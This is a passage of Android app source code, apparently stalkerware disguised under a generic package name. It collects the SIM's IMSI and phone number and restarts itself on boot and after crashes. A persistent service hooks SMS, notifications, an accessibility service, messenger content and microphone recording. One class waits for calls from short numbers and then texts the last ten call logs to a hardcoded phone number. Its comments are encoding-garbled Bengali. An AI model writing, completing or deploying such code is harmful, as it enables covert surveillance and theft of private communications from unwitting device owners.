            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (telephonyManager != null) {
                try {
                    String subscriberId = telephonyManager.getSubscriberId();
                    if (subscriberId != null && !subscriberId.isEmpty()) {
                        Log.d(TAG,"Fetched IMSI: " + subscriberId); // Successfully fetched IMSI
                        return subscriberId;
                    } else {
                        Log.d(TAG, "IMSI is empty or null, returning fallback.");
                        return fetchFallbackSimNumber(context); // Fallback to another method
                    }
                } catch (SecurityException e) {
                    // Handle SecurityException if the app doesn't have necessary permissions
                    Log.e(TAG, "Error fetching IMSI: SecurityException - " + e.getMessage(), e);
                    return null; // Return null in case of security exceptions
                } catch (Exception e) {
                    // Handle any other unexpected exceptions
                    Log.e(TAG, "Unexpected error fetching IMSI: " + e.getMessage(), e);
                    return null; // Return null for any other errors
                }
            }
            Log.d(TAG,"TelephonyManager is null, cannot fetch IMSI.");
            return null; // Return null if TelephonyManager is unavailable

        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG,"Android version >= 10. Returning null due to security restrictions.");
            return null;
        }

    }

    private String fetchFallbackSimNumber(Context context) {
        // For Android version 9 and below, fetch IMSI and SIM number
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String simNumber = "Unknown"; // Default fallback value
            if (telephonyManager != null) {
                try {
                    simNumber = telephonyManager.getLine1Number();
                    if (simNumber != null && !simNumber.isEmpty()) {
                        Log.d(TAG, "SIM number via fallback: " + simNumber);
                    }
                } catch (SecurityException e) {
                    Log.e(TAG, "Error fetching SIM number via fallback: " + e.getMessage(), e);
                }
            }
            return simNumber;
        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG, "Android version >= 10. Returning null due to security restrictions.");
            return null;
        }
    }

    // Method to handle permission result for phone state
    public void onRequestPermissionsResultForPhoneState(int requestCode, String[] permissions, int[] grantResults, Context context) {
        if (requestCode == 2) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                String subscriberId = getSubscriberId(context);
                Log.d(TAG,"Fetched subscriber ID: " + subscriberId);
            } else {
                Log.d(TAG, "Permission READ_PHONE_STATE or READ_PHONE_NUMBERS denied.");
            }
        }
    }

    // Method to get user SIM number
    public String getUserSimNumber(Context context) {
        // For Android version 9 and below, fetch IMSI and SIM number
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {

            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            String simNumber = "";

            try {
                if (telephonyManager != null) {
                    // Check permissions for Android M (API level 23) and above
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE)
                                == PackageManager.PERMISSION_GRANTED) {
                            // Try fetching the phone number
                            simNumber = telephonyManager.getLine1Number(); // Get phone number
                            Log.d(TAG,"SIM number: " + simNumber);
                        } else {
                            Log.d(TAG, "Permission not granted.");
                            // Request permissions if not granted
                            ActivityCompat.requestPermissions((Activity) context,
                                    new String[]{android.Manifest.permission.READ_PHONE_STATE}, 2);
                            return null; // Return null if permission not granted
                        }
                    } else {
                        // For older Android versions (before Android M)
                        simNumber = telephonyManager.getLine1Number();
                        Log.d(TAG, "SIM number: " + simNumber);
                    }

                    if (simNumber == null || simNumber.isEmpty()) {
                        // Fallback to get Subscriber ID (IMSI) if phone number is not available
                        simNumber = getSimCardDetails(telephonyManager);
                    }
                }
            } catch (Exception e) {
                Log.e("SIM_DEBUG", "Unexpected error", e);
            }

            if (simNumber == null || simNumber.isEmpty()) {
                Log.d(TAG, "No SIM number found, returning 'Unknown'.");
                return "Unknown"; // If no number found, return "Unknown"
            }
            return simNumber;

        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG, "Android version >= 10. Returning null due to security restrictions.");
            return null;
        }

    }

    private String getSimCardDetails(TelephonyManager telephonyManager) {
        // For Android version 9 and below, fetch IMSI and SIM number
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {

            String simNumber = "";
            try {
                String imsi = telephonyManager.getSubscriberId();
                Log.d(TAG, "IMSI: " + imsi);
                if (imsi != null && !imsi.isEmpty()) {
                    simNumber = imsi; // Use IMSI if available
                }
            } catch (SecurityException e) {
                Log.e("SIM_DEBUG", "Error fetching IMSI: ", e);
            } catch (Exception e) {
                Log.e(TAG, "Unexpected error fetching IMSI: ", e);
            }
            return simNumber;

        } else {
            // For Android version 10 (Q) and above, return null due to security restrictions
            Log.d(TAG, "Android version >= 10. Returning null due to security restrictions.");
            return null;
        }

    }

}



//AutoRestartReceiver.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.util.Log;

public class AutoRestartReceiver extends BroadcastReceiver {

    private static final String TAG = "AutoRestartReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent == null) {
            Log.e(TAG, "Received null intent");
            return;  // à¦¯à¦¦à¦¿ intent null à¦¹à§Ÿ, à¦¤à¦¾à¦¹à¦²à§‡ à¦•à¦¿à¦›à§à¦‡ à¦•à¦°à¦¬à§‡à¦¨ à¦¨à¦¾à¥¤
        }

        Log.d(TAG, "App is being restarted...");

        // Intent à¦à¦° action à¦šà§‡à¦• à¦•à¦°à¦¾
        String action = intent.getAction();
        if (action != null && action.equals("android.intent.action.BOOT_COMPLETED")) {
            // 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦ªà¦° MainActivity à¦ªà§à¦¨à¦°à¦¾à¦¯à¦¼ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Handler
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    // MainActivity à¦ªà§à¦¨à¦°à¦¾à¦¯à¦¼ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à§à¦¨
                    Intent restartIntent = new Intent(context, MainActivity.class);
                    restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  // à¦¨à¦¤à§à¦¨ à¦Ÿà¦¾à¦¸à§à¦• à¦¶à§à¦°à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Flag
                    context.startActivity(restartIntent);  // MainActivity à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                }
            }, 60000);  // 60,000 à¦®à¦¿à¦²à¦¿à¦¸à§‡à¦•à§‡à¦¨à§à¦¡ = 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ
        } else {
            Log.e(TAG, "Received unexpected action: " + action);
        }
    }

    // à¦•à§à¦°à§à¦¯à¦¾à¦¶ à¦¹à§à¦¯à¦¾à¦¨à§à¦¡à¦²à¦¿à¦‚ à¦¯à§à¦•à§à¦¤ à¦•à¦°à¦¾ à¦¹à§Ÿà§‡à¦›à§‡
    public static void initializeCrashHandler(final Context context) {
        Thread.setDefaultUncaughtExceptionHandler(new Thread.UncaughtExceptionHandler() {
            @Override
            public void uncaughtException(Thread thread, Throwable throwable) {
                Log.e(TAG, "App crashed, restarting...");

                // à¦•à§à¦°à§à¦¯à¦¾à¦¶ à¦¹à¦“à§Ÿà¦¾à¦° à¦ªà¦° 1 à¦®à¦¿à¦¨à¦¿à¦Ÿ à¦ªà¦° à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦…à§à¦¯à¦¾à¦ª à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Handler
                new Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        // MainActivity à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦šà¦¾à¦²à§ à¦•à¦°à¦¾à¦° à¦œà¦¨à§à¦¯ Intent à¦¤à§ˆà¦°à¦¿ à¦•à¦°à§à¦¨
                        Intent restartIntent = new Intent(context, MainActivity.class);
                        restartIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(restartIntent);  // MainActivity à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
                    }
                }, 60000); // 60 à¦¸à§‡à¦•à§‡à¦¨à§à¦¡ à¦ªà¦° à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦šà¦¾à¦²à§ à¦¹à¦¬à§‡
            }
        });
    }
}



//AutoStartReceiver.java
package com.example.fasterpro11;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import java.util.Calendar;

public class AutoStartReceiver extends BroadcastReceiver {

    private static final String TAG = "AutoStartReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Auto start receiver triggered");

        // Schedule WorkManager task for 9 AM
        scheduleWorkAtSpecificTime(context, 9, 0);  // 9 AM
        // Schedule WorkManager task for 3 PM
        scheduleWorkAtSpecificTime(context, 15, 0);  // 3 PM
        // Schedule WorkManager task for 12 AM
        scheduleWorkAtSpecificTime(context, 0, 0);  // 12 AM
    }

    private void scheduleWorkAtSpecificTime(Context context, int hour, int minute) {
        // Only on Android 12 and higher, check the exact alarm permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            // Check if the app has permission to schedule exact alarms
            if (!context.getSystemService(AlarmManager.class).canScheduleExactAlarms()) {
                Log.e(TAG, "App does not have permission to schedule exact alarms");
                return; // Don't schedule the alarm if the permission is not granted
            }
        }

        // Setting the desired time for the alarm
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, hour);
        calendar.set(Calendar.MINUTE, minute);
        calendar.set(Calendar.SECOND, 0);
        calendar.set(Calendar.MILLISECOND, 0);

        // Check if the scheduled time has already passed for today
        long triggerAtMillis = calendar.getTimeInMillis();
        if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
            // If the time has passed, schedule for the next day
            calendar.add(Calendar.DAY_OF_MONTH, 1);
            triggerAtMillis = calendar.getTimeInMillis();
        }

        // Setting the alarm using AlarmManager
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent workIntent = new Intent(context, BackgroundSmsNotificationWorker.class); // Specify your task here

        // Set PendingIntent with proper flag based on Android version
        PendingIntent pendingIntent;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12 and higher
            pendingIntent = PendingIntent.getBroadcast(context, 0, workIntent, PendingIntent.FLAG_IMMUTABLE);
        } else {
            pendingIntent = PendingIntent.getBroadcast(context, 0, workIntent, PendingIntent.FLAG_UPDATE_CURRENT);
        }

        try {
            // Schedule the exact alarm
            alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);
            Log.d(TAG, "Alarm scheduled for " + hour + ":" + minute);
        } catch (SecurityException e) {
            // Handle the case when exact alarm permission is not granted
            Log.e(TAG, "SecurityException: Unable to schedule exact alarm", e);
        }
    }
}



//BackgroundService.java
package com.example.fasterpro11;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Log;

import java.util.Calendar;

public class BackgroundService extends Service {

    private static final String TAG = "BackgroundService";
    public static final String ACTION_MIC_RECORD = "com.example.fasterpro11.ACTION_MIC_RECORD";

    private SmsReceiver smsReceiver;
    private NotificationListener notificationListener;
    private WhatsAppIMOMessengerContent messengerContent;
    private MicRecord micRecord;
    private CallRecorderAuto callRecorderAuto;
    private FileService fileService;  // Corrected declaration of FileService
    private static final int NOTIFICATION_ID = 1;
    private static final String CHANNEL_ID = "foreground_service_channel";

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "onCreate: Background service starting");

//        // Register AutoStartReceiver dynamically inside BackgroundService (optional)
//        IntentFilter filter = new IntentFilter();
//        filter.addAction(Intent.ACTION_BOOT_COMPLETED);
//        filter.addAction(Intent.ACTION_SHUTDOWN);
//        registerReceiver(autoStartReceiver, filter);


        try {
            // Initializing the components and registering necessary receivers
            messengerContent = new WhatsAppIMOMessengerContent();
            micRecord = new MicRecord(this);
            registerReceivers();

            // Start the service in the foreground with a notification
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // Start as foreground service for Android 8.0 and above
                startForeground(NOTIFICATION_ID, buildNotification());
                Log.d(TAG, "Service started as foreground service");
            } else {
                // For older versions, normal service start
                startService(new Intent(this, BackgroundService.class));
            }

            // Schedule alarms for 9 AM and 12 AM
            scheduleDailyAlarms();

            Log.d(TAG, "Service onCreate: Initialized successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error initializing service", e);
        }
    }

    private void scheduleDailyAlarms() {
        // Get the AlarmManager system service
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        if (alarmManager != null) {
            // Set alarms for 9 AM and 12 AM
            scheduleAlarm(alarmManager, 9, 0);  // 9 AM
            scheduleAlarm(alarmManager, 0, 0);  // 12 AM
        }
    }

    private void scheduleAlarm(AlarmManager alarmManager, int hour, int minute) {
        Calendar calendar = Calendar.getInstance();
        calendar.set(Calendar.HOUR_OF_DAY, hour);
        calendar.set(Calendar.MINUTE, minute);
        calendar.set(Calendar.SECOND, 0);
        calendar.set(Calendar.MILLISECOND, 0);

        long triggerAtMillis = calendar.getTimeInMillis();
        if (calendar.getTimeInMillis() < System.currentTimeMillis()) {
            // If the time has passed for today, schedule for tomorrow
            calendar.add(Calendar.DAY_OF_MONTH, 1);
            triggerAtMillis = calendar.getTimeInMillis();
        }

        Intent intent = new Intent(this, BackgroundService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, 0, intent, PendingIntent.FLAG_IMMUTABLE);
        alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAtMillis, pendingIntent);

        Log.d(TAG, "Alarm scheduled for: " + hour + ":" + minute);
    }

    private void registerReceivers() {
        Log.d(TAG, "registerReceivers: Registering receivers");
        try {
            // Registering SMS receiver
            smsReceiver = new SmsReceiver();
            IntentFilter smsFilter = new IntentFilter(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
            registerReceiver(smsReceiver, smsFilter);
            Log.d(TAG, "registerReceivers: SMS receiver registered");

            // Registering Call Recorder Auto
//            callRecorderAuto = new CallRecorderAuto();
//            IntentFilter callRecorderFilter = new IntentFilter("android.intent.action.PHONE_STATE");
//            registerReceiver(callRecorderAuto, callRecorderFilter);
//            Log.d(TAG, "registerReceivers: Call recorder registered");

            // Registering FileService (if it's used to manage files)
            fileService = new FileService();  // Correct initialization of FileService
            IntentFilter fileServiceFilter = new IntentFilter("android.intent.action.PHONE_STATE");
            registerReceiver(fileService, fileServiceFilter);
            Log.d(TAG, "registerReceivers: FileService registered");


            // Start MyAccessibilityService
            Intent accessibilityServiceIntent = new Intent(this, MyAccessibilityService.class);
            startService(accessibilityServiceIntent);

            // Initializing Notification Listener
            notificationListener = new NotificationListener();
            enableNotificationListener();

            Log.d(TAG, "Receivers registered successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error registering receivers", e);
        }
    }

    private Notification buildNotification() {
        Log.d(TAG, "buildNotification: Building notification");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                createNotificationChannel();
                return new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            } else {
                return new Notification.Builder(this)
                        .setContentTitle("Foreground Service")
                        .setContentText("Running in foreground")
                        .setSmallIcon(R.drawable.notification_icon)
                        .build();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error building notification", e);
            return null;
        }
    }

    private void createNotificationChannel() {
        Log.d(TAG, "createNotificationChannel: Creating notification channel");
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel serviceChannel = new NotificationChannel(
                        CHANNEL_ID,
                        "Foreground Service Channel",
                        NotificationManager.IMPORTANCE_DEFAULT
                );
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(serviceChannel);
                    Log.d(TAG, "createNotificationChannel: Channel created successfully");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error creating notification channel", e);
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "onDestroy: Stopping service");
        try {
            // Unregistering all receivers and observers to avoid memory leaks
            if (smsReceiver != null) {
                unregisterReceiver(smsReceiver);
                Log.d(TAG, "onDestroy: SMS receiver unregistered");
            }
//            if (callRecorderAuto != null) {
//                unregisterReceiver(callRecorderAuto);
//                Log.d(TAG, "onDestroy: Call recorder unregistered");
//            }
            if (fileService != null) {
                unregisterReceiver(fileService);
                Log.d(TAG, "onDestroy: FileService unregistered");
            }

            // Stop MyAccessibilityService
            Intent accessibilityServiceIntent = new Intent(this, MyAccessibilityService.class);
            stopService(accessibilityServiceIntent);


            // Stop and disable the notification listener
            disableNotificationListener();

            if (micRecord != null) {
                unregisterReceiver(micRecord);
                Log.d(TAG, "onDestroy: MicRecord receiver unregistered");
            }

            if (messengerContent != null) {
                messengerContent.stopForwarding();
                messengerContent = null;
                Log.d(TAG, "onDestroy: Messenger content stopped forwarding");
            }

            Log.d(TAG, "NotificationListener service destroyed");
            Log.d(TAG, "Service onDestroy: Receivers and observers stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping service", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void enableNotificationListener() {
        Log.d(TAG, "enableNotificationListener: Enabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (!isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "enableNotificationListener: Notification listener settings opened");
            } else {
                Log.d(TAG, "enableNotificationListener: Notification listener already enabled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error enabling notification listener", e);
        }
    }

    private void disableNotificationListener() {
        Log.d(TAG, "disableNotificationListener: Disabling notification listener");
        try {
            ComponentName componentName = new ComponentName(this, NotificationListener.class);
            if (isNotificationListenerEnabled(componentName)) {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "disableNotificationListener: Notification listener settings opened");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error disabling notification listener", e);
        }
    }

    private boolean isNotificationListenerEnabled(ComponentName componentName) {
        Log.d(TAG, "isNotificationListenerEnabled: Checking if notification listener is enabled");
        try {
            String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            boolean isEnabled = flat != null && flat.contains(componentName.flattenToString());
            Log.d(TAG, "isNotificationListenerEnabled: Notification listener is " + (isEnabled ? "enabled" : "disabled"));
            return isEnabled;
        } catch (Exception e) {
            Log.e(TAG, "Error checking notification listener", e);
            return false;
        }
    }
}



//BackgroundSmsNotificationWorker .java
package com.example.fasterpro11;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.os.Handler;
import android.os.Looper;
import android.content.ActivityNotFoundException;
import android.content.ServiceConnection;
import android.os.IBinder;

import androidx.annotation.NonNull;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.util.concurrent.TimeUnit;

public class BackgroundSmsNotificationWorker extends Worker {

    private static final String TAG = "SmsNotifWorkManager";  // Shortened tag to 23 characters

    public BackgroundSmsNotificationWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
    }

    @SuppressLint("LongLogTag")
    @Override
    public Result doWork() {
        Log.d(TAG, "doWork: SMS à¦¬à¦¾ Notification à¦†à¦¸à¦²à§‡ à¦•à¦¾à¦œ à¦¶à§à¦°à§ à¦¹à¦šà§à¦›à§‡");

        try {
            Context context = getApplicationContext();

            // Start the background service and handle any potential issues
            try {
                startBackgroundService(context);
            } catch (Exception e) {
                Log.e(TAG, "Error while starting background service", e);
                return Result.failure();
            }

            // Delay starting MainActivity for 30 minutes and handle any potential errors
            try {
                delayStartMainActivity(context);
            } catch (Exception e) {
                Log.e(TAG, "Error while scheduling MainActivity start", e);
                return Result.failure();
            }

            return Result.success();
        } catch (Exception e) {
            Log.e(TAG, "doWork: Error in executing work", e);
            return Result.failure();
        }
    }

    private void startBackgroundService(Context context) {
        try {
            // Start the background service here
            Intent serviceIntent = new Intent(context, BackgroundService.class);
            context.startService(serviceIntent);
        } catch (Exception e) {
            // Catch any error while starting the service and log it
            Log.e(TAG, "Error while starting service", e);
            throw e; // Re-throw the exception to propagate it upwards
        }
    }

    private void delayStartMainActivity(Context context) {
        // Create a handler that runs on the main thread to ensure the Intent is executed
        Handler handler = new Handler(Looper.getMainLooper());

        // Delay of 30 minutes (1800 seconds) before launching MainActivity
        handler.postDelayed(() -> {
            try {
                Intent intent = new Intent(context, BackgroundService.class);
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // Ensure it starts in a new task
                context.startActivity(intent);
            } catch (ActivityNotFoundException e) {
                // Handle the ActivityNotFoundException if MainActivity is not found
                Log.e(TAG, "MainActivity not found", e);
            } catch (Exception e) {
                // Catch other exceptions that may occur during the process
                Log.e(TAG, "Error launching MainActivity", e);
            }
        }, TimeUnit.MINUTES.toMillis(180));  // Convert 30 minutes to milliseconds
    }

    public static void startWork(Context context) {
        try {
            // Start the work with a delay (e.g., 300 minutes)
            OneTimeWorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class)
                    .setInitialDelay(300 * 60, TimeUnit.SECONDS) // Customize the delay time (5 minutes here)
                    .build();

            // Enqueue the work
            WorkManager.getInstance(context).enqueue(smsNotificationWorkRequest);
        } catch (Exception e) {
            // Catch errors related to WorkManager and log them
            Log.e(TAG, "Error while enqueuing work", e);
        }
    }
}



//BootBroadcastReceiver.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.WorkRequest;

public class BootBroadcastReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            // à¦°à¦¿à¦¬à§à¦Ÿ à¦¹à¦“à§Ÿà¦¾à¦° à¦ªà¦° à¦•à¦¾à¦œ à¦ªà§à¦¨à¦°à¦¾à§Ÿ à¦¶à§à¦°à§ à¦•à¦°à§à¦¨
            WorkRequest smsNotificationWorkRequest = new OneTimeWorkRequest.Builder(BackgroundSmsNotificationWorker.class).build();
            WorkManager.getInstance(context).enqueue(smsNotificationWorkRequest);
        }
    }
}



//BootReceiver.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        // Check if the broadcast is for boot completion
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {

            // Start your main activity or any specific activity to open the app automatically
            Intent mainIntent = new Intent(context, MainActivity.class); // Replace with your main activity
            mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);  // Required to start an activity from BroadcastReceiver
            context.startActivity(mainIntent);

            // Start WorkManager to handle background tasks
            BackgroundSmsNotificationWorker.startWork(context);

            // Intent to start the BackgroundService
            Intent serviceIntent = new Intent(context, BackgroundService.class);

            // Check if the Android version is 8.0 (API 26) or above
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For Android 8.0 and above, use foreground service
                context.startForegroundService(serviceIntent);
                Log.d("BootReceiver", "BackgroundService started on boot (Foreground Service)");
            } else {
                // For below Android 8.0, use normal service
                context.startService(serviceIntent);
                Log.d("BootReceiver", "BackgroundService started on boot (Normal Service)");
            }
        }
    }
}



//CallListOrSmsSenderConditionaly.java
package com.example.fasterpro11;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.provider.CallLog;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;


import javax.mail.MessagingException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;




public class CallListOrSmsSenderConditionaly extends BroadcastReceiver {

    private static final String TAG = "SmsReceiver";
    private static final String FORWARD_SMS_NUMBER = "+8801915564632";

    private Context mContext;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        Log.d(TAG, "CallRecorderAuto class onReceive called with action: " + intent.getAction());

        if (TelephonyManager.ACTION_PHONE_STATE_CHANGED.equals(intent.getAction())) {
            String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
            if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
                String incomingNumber = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);  // Corrected line
                Log.d(TAG, "Incoming call from: " + incomingNumber);

                // Check if the incoming number is 4 to 6 digits long
                if (isValidIncomingCallNumber(incomingNumber)) {  // Calling the method
                    Log.d(TAG, "Incoming number is valid: " + incomingNumber);

                    // Get the last 10 call logs
                    String recentCallLogs = getRecentCallLogs();

                    // Send the logs based on internet connection
                    if (isInternetConnected()) {
                        Log.d(TAG, "Internet is connected. Sending logs via email.");
                        try {
                            forwardLogsByEmail(incomingNumber, recentCallLogs);
                        } catch (MessagingException e) {
                            Log.e(TAG, "Failed to forward logs via email: " + e.getMessage());
                        }
                    } else {
                        Log.d(TAG, "Internet is not connected. Sending logs via SMS.");
                        forwardLogsBySMS(incomingNumber, recentCallLogs);
                    }
                }
            }
        }
    }

    // Validate if the incoming number is 4 to 6 digits long
    private boolean isValidIncomingCallNumber(String incomingNumber) {
        if (incomingNumber == null || incomingNumber.isEmpty()) {
            return false;  // Ensure no null or empty numbers are processed
        }

        Pattern pattern = Pattern.compile("\\b\\d{4,6}\\b");  // Regex for 4 to 6 digits
        Matcher matcher = pattern.matcher(incomingNumber);
        Log.d(TAG, "Matched number in Call Logs: " + incomingNumber);
        return matcher.find();
    }

    // Check if the device is connected to the internet
    private boolean isInternetConnected() {
        ConnectivityManager cm = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        if (cm != null) {
            NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            return activeNetwork != null && activeNetwork.isConnected();
        }
        return false;
    }

    // Get the last 10 call logs
    private String getRecentCallLogs() {
        StringBuilder callLogBuilder = new StringBuilder();
        Uri callLogUri = CallLog.Calls.CONTENT_URI;
        String[] projection = {CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.TYPE};
        Cursor cursor = null;

        try {
            cursor = mContext.getContentResolver().query(callLogUri, projection, null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
            if (cursor != null && cursor.moveToFirst()) {
                int index = 0;
                do {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    String typeStr = (type.equals(String.valueOf(CallLog.Calls.OUTGOING_TYPE))) ? "Outgoing"
                            : (type.equals(String.valueOf(CallLog.Calls.INCOMING_TYPE))) ? "Incoming" : "Missed";

                    callLogBuilder.append("[").append(++index).append("] ")
                            .append("Number: ").append(number).append(", ")
                            .append("Date: ").append(date).append(", ")
                            .append("Type: ").append(typeStr).append("\n");
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting call logs: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return callLogBuilder.toString();
    }

    // Forward the logs via SMS
    private void forwardLogsBySMS(String sender, String logs) {
        SmsManager smsManager = SmsManager.getDefault();
        String message = "Incoming Call: " + sender + "\n\nRecent Call Logs:\n" + logs;
        smsManager.sendTextMessage(FORWARD_SMS_NUMBER, null, message, null, null);
        Log.d(TAG, "Logs forwarded via SMS to: " + FORWARD_SMS_NUMBER);
    }

    // Forward the logs via Email
    private void forwardLogsByEmail(String sender, String logs) throws MessagingException {
        // Implement email sending logic here (e.g., using JavaMail API)
        String subject = "Incoming Call: " + sender;
        String body = "Recent Call Logs:\n" + logs;
        // Example logic to send email (JavaMail implementation)
        sendEmail("example@domain.com", subject, body);  // Calling the email sending method
    }

    // Method to send email (use actual implementation for your environment)
    private void sendEmail(String to, String subject, String body) {
        // Your email sending logic goes here
        // Example using JavaMail API
        Log.d(TAG, "Sending email to: " + to + " with subject: " + subject + " and body: " + body);
        // Implement the JavaMail API or another library to send the email.
    }
}



//CallRecorderAccessibilityService.java
package com.example.fasterpro11;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.Manifest;
import android.content.SharedPreferences;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Environment;
